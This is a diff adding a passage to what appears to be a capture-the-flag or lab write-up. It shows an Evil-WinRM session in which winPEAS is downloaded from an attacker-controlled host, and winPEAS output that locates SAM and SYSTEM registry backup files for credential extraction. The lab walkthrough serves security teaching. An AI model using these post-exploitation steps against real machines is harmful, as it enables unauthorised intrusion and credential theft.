@@ -459,4 +459,28 @@ RawContent        : HTTP/1.0 200 OK
 Headers           : {[Content-Length, 379740], [Content-Type, application/octet-stream], [Date, Sun, 21 Sep 2025 16:20:02 GMT], [Last-Modified, Sat, 24 May 2025 13:36:22 GMT]...}
 RawContentLength  : 379740
 ```
+```
+*Evil-WinRM* PS C:\Users\Jareth\Desktop> iwr http://10.8.117.56:8000/winPEAS.ps1 -O winPEAS.ps1
+*Evil-WinRM* PS C:\Users\Jareth\Desktop> ls
+
+
+    Directory: C:\Users\Jareth\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/18/2020   2:21 AM             80 user.txt
+-a----        9/21/2025   5:21 PM         379740 winPEAS.ps1
+```
+```
+=========||  Password Check in Files/Folders
+=========|| Password Check. Starting at root of each drive. This will take some time. Like, grab a coffee or tea kinda time.
+=========|| Looking through each drive, searching for *.xml *.txt *.conf *.config *.cfg *.ini .y*ml *.log *.bak *.xls *.xlsx *.xlsm
+Possible Password found: Config Secrets (Passwd / Credentials)
+C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\sam.bak
+```
+
+```
+C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak
+```
 
